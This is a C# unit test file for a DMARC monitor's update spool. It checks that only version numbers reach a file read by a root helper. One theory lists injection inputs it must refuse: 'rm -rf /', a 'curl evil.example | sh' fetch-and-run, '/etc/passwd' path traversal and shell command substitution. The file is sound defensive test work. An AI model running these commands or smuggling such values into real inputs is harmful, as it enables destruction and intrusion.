using System.Text.Json;
using DmarcMonitor.Core.Updates;

namespace DmarcMonitor.Core.Tests.Updates;

/// <summary>
/// The boundary between the app and the thing that can install software.
///
/// The app runs unprivileged and holds credentials that rewrite customers'
/// DNS. It cannot replace its own files; it writes down a version, and a unit
/// running as root decides whether to act on it. So the question these answer
/// is: what can an attacker who owns the web app put into that file?
///
/// The answer has to be "a version number, and nothing that could be anything
/// else". The helper checks again on its side, and additionally refuses
/// anything that is not a published release - but the first refusal is here.
/// </summary>
public sealed class UpdateSpoolTests : IDisposable
{
    private readonly string _dir =
        Path.Combine(Path.GetTempPath(), $"dmarc-spool-{Guid.NewGuid():N}");

    private UpdateSpool Spool() => new(_dir);

    public void Dispose()
    {
        try { Directory.Delete(_dir, recursive: true); } catch (IOException) { }
    }

    // ---- what must never reach the file --------------------------------------

    [Theory]
    [InlineData("v1.2.0; rm -rf /")]
    [InlineData("v1.2.0 && curl evil.example | sh")]
    [InlineData("../../../etc/passwd")]
    [InlineData("v1.2.0/../../../tmp")]
    [InlineData("$(whoami)")]
    [InlineData("`id`")]
    [InlineData("v1.2.0\nv9.9.9")]
    [InlineData("https://evil.example/payload")]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("latest")]
    [InlineData("main")]
    public async Task RefusesAnythingThatIsNotAVersionNumber(string version)
    {
        // Every one of these is something an attacker who owned the web app
        // might try to get a root process to act on.
        await Assert.ThrowsAsync<ArgumentException>(() => Spool().RequestAsync(version, "tester"));

        Assert.False(File.Exists(Spool().RequestPath));
    }

    [Theory]
    [InlineData("v1.2.0")]
    [InlineData("1.2.0")]
    [InlineData("v1.2")]
    [InlineData("v1.2.3.4")]
    [InlineData("v1.4.0-rc1")]
    [InlineData("v1.4.0-beta.2")]
    public void AcceptsTheShapesARealTagTakes(string version)
    {
        Assert.True(UpdateSpool.IsValidVersion(version));
    }

    // ---- what it writes ------------------------------------------------------

    [Fact]
    public async Task WritesTheVersionAndWhoAskedForIt()
    {
        var spool = Spool();

        await spool.RequestAsync("1.3.0", "matthew@nextlayersec.io");

        var text = await File.ReadAllTextAsync(spool.RequestPath);
        var request = JsonSerializer.Deserialize<UpdateRequest>(text);

        Assert.NotNull(request);
        // Normalised to the tag form, so the helper never has to guess.
        Assert.Equal("v1.3.0", request.Version);
        Assert.Equal("matthew@nextlayersec.io", request.RequestedBy);

        // Asserted on the TEXT, not just the round trip. The thing that reads
        // this is a shell script using python's json, which is case sensitive
        // about the key - and System.Text.Json is not on the way back in, so
        // deserialising it here would still pass if the names ever changed to
        // camelCase and the helper had started reading empty strings.
        Assert.Contains("\"Version\"", text, StringComparison.Ordinal);
        Assert.Contains("\"RequestedBy\"", text, StringComparison.Ordinal);
    }

    [Fact]
    public async Task AskingLeavesSomethingForThePageToShow()
    {
        // Between the click and the helper waking up there is a gap, and a
        // page that shows nothing during it reads as a button that did not
        // work.
        var spool = Spool();

        await spool.RequestAsync("1.3.0", "tester");
        var progress = await spool.ReadStatusAsync();

        Assert.Equal(UpdateState.Requested, progress.State);
        Assert.Equal("v1.3.0", progress.Version);
        Assert.Contains("tester", progress.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task NothingAskedForIsIdleRatherThanAnError()
    {
        Assert.Equal(UpdateState.Idle, (await Spool().ReadStatusAsync()).State);
    }

    [Fact]
    public async Task ReadsWhatTheHelperWrote()
    {
        // The helper writes this file from a shell script, so the shape has
        // to survive the round trip between the two.
        var spool = Spool();
        Directory.CreateDirectory(_dir);

        await File.WriteAllTextAsync(spool.StatusPath, """
            {
              "State": "Succeeded",
              "Version": "v1.3.0",
              "Message": "Updated to v1.3.0. The previous install was kept, for rolling back.",
              "At": "2026-09-18T12:00:00Z",
              "Stamp": "20260918-120000"
            }
            """);

        var progress = await spool.ReadStatusAsync();

        Assert.Equal(UpdateState.Succeeded, progress.State);
        Assert.Equal("v1.3.0", progress.Version);
        Assert.Equal("20260918-120000", progress.Stamp);
    }

    [Fact]
    public async Task AStatusFileBeingWrittenIsNotAnError()
    {
        // The helper writes atomically, but a truncated or foreign file must
        // not take the page down either.
        var spool = Spool();
        Directory.CreateDirectory(_dir);
        await File.WriteAllTextAsync(spool.StatusPath, "{ \"State\": ");

        var progress = await spool.ReadStatusAsync();

        Assert.Equal(UpdateState.Idle, progress.State);
    }

    [Fact]
    public async Task TheStatusTheAppWritesUsesTheNamesTheHelperWrites()
    {
        // Both sides write this file. If they disagreed about the shape, the
        // page would show a stale status forever without saying why.
        var spool = Spool();
        await spool.RequestAsync("1.3.0", "tester");

        var text = await File.ReadAllTextAsync(spool.StatusPath);

        Assert.Contains("\"State\"", text, StringComparison.Ordinal);
        Assert.Contains("\"Requested\"", text, StringComparison.Ordinal);   // the name, not a number
        Assert.Contains("\"Version\"", text, StringComparison.Ordinal);
        Assert.Contains("\"Message\"", text, StringComparison.Ordinal);
    }

    [Fact]
    public void SaysWhenTheMachineryIsNotSetUp()
    {
        // Without the agent installed the app can still write a request and
        // nothing would ever read it. The page needs to know that rather than
        // offering a button that silently does nothing.
        Assert.False(Spool().IsAvailable);

        Directory.CreateDirectory(_dir);
        Assert.True(Spool().IsAvailable);
    }
}
